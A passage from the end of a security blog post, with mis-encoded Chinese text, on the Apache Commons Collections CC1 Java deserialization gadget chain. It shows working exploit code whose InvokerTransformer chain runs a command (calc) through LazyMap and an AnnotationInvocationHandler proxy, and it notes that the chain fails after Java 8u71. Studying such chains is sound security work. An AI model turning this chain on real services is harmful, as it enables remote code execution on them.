</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">outerMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="n">chain</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">constructor1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="n">constructor1</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Retention</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">outerMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">[]</span><span class="w"> </span><span class="n">interfaces</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getInterfaces</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">proxyMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">)</span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">LazyMap</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="n">interfaces</span><span class="p">,</span><span class="n">handler</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constructor1</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Retention</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">proxyMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//Â∫èÂàóÂåñ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;ser.ser&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">x</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">x</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//ÂèçÂ∫èÂàóÂåñ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ctf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;ser.ser&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ctf</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ctf</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>‰πüÊàêÂäüÂºπÂá∫ËÆ°ÁÆóÊú∫Ôºö</p>
<p><img src="/p/cc1/image-20240727012024028.png"
	width="1673"
	height="267"
	srcset="/p/cc1/image-20240727012024028_hu9386675741106695574.png 480w, /p/cc1/image-20240727012024028_hu5606643248461075634.png 1024w"
	loading="lazy"
	
		alt="image-20240727012024028"
	
	
		class="gallery-image" 
		data-flex-grow="626"
		data-flex-basis="1503px"
	
></p>
<h5 id="cc1ÁöÑÂ±ÄÈôê">CC1ÁöÑÂ±ÄÈôê
</h5><p>Âú®Java 8u71‰ª•ÂêéÔºåÂÆòÊñπ‰øÆÊîπ‰∫Üsun.reflect.annotation.AnnotationInvocationHandlerÁöÑreadObjectÊñπÊ≥ï„ÄÇ</p>
<p>ÊîπÂä®ÂêéÔºå‰∏çÂÜçÁõ¥Êé•‰ΩøÁî®ÂèçÂ∫èÂàóÂåñÂæóÂà∞ÁöÑMapÂØπË±°ÔºåËÄåÊòØÊñ∞Âª∫‰∫Ü‰∏Ä‰∏™LinkedHashMapÂØπË±°ÔºåÂπ∂Â∞ÜÂéüÊù•ÁöÑÈîÆÂÄºÊ∑ªÂä†ËøõÂéª„ÄÇÊâÄ‰ª•ÔºåÂêéÁª≠ÂØπMapÁöÑÊìç‰ΩúÈÉΩÊòØÂü∫‰∫éËøô‰∏™Êñ∞ÁöÑLinkedHashMapÂØπË±°ÔºåËÄåÂéüÊù•Êàë‰ª¨Á≤æÂøÉÊûÑÈÄ†ÁöÑMap‰∏çÂÜçÊâßË°åsetÊàñputÊìç‰ΩúÔºå‰πüÂ∞±‰∏ç‰ºöËß¶ÂèëRCE‰∫Ü„ÄÇ</p>
<p><strong>ÂèÇËÄÉÊñáÁ´†Ôºö</strong>
ÔºàÂêéÈù¢CCÈìæÈÉΩÊòØË∑üËøáÁöÑÔºåËøòÊúâÁöÑ‰∏çÊ≠¢CCÈìæÔºåÂèØ‰ª•Â§öÁúãÁúãÂà´‰∫∫ÁöÑÂçöÂÆ¢ÔºåÊØîÂ¶ÇÁ¨¨‰∏Ä‰∏™‰∫∫ÁöÑÂ∞±ÊòØÔºåÂº∫Êé®Ôºâ</p>
<p><code>https://su18.org/post/ysoserial-su18-2/#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-2</code></p>
<p><code>https://xz.aliyun.com/t/10387?time__1311=Cqjx2Qi%3DomqGqGNDQieiKd7KF8DAhOi3RiD#toc-2</code></p>
<p>ÂΩìÁÑ∂niviaÁöÑÂçöÂÆ¢Ôºö
<code>https://nivi4.notion.site/Java-CommonCollections2-bffcf256243d414192c43fdefc916df9</code></p>

</section>


    <footer class="article-footer">
    

    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Áõ∏ÂÖ≥ÊñáÁ´†</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/jdk7u21%E5%8E%9F%E7%94%9F%E9%93%BE/">
        
        

        <div class="article-details">
            <h2 class="article-title">JDK7u21ÂéüÁîüÈìæ</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/rome%E9%93%BE/">
        
        

        <div class="article-details">
            <h2 class="article-title">RomeÈìæ</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/cb%E9%93%BE/">
        
        

        <div class="article-details">
            <h2 class="article-title">CBÈìæ</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/cc7/">
        
        

        <div class="article-details">
            <h2 class="article-title">CC7</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/cc6/">
        
        

        <div class="article-details">
            <h2 class="article-title">CC6</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2025 Example Person
    </section>
    
    <section class="powerby">
        ‰ΩøÁî® <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> ÊûÑÂª∫ <br />
        ‰∏ªÈ¢ò <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> Áî± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> ËÆæËÆ°
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
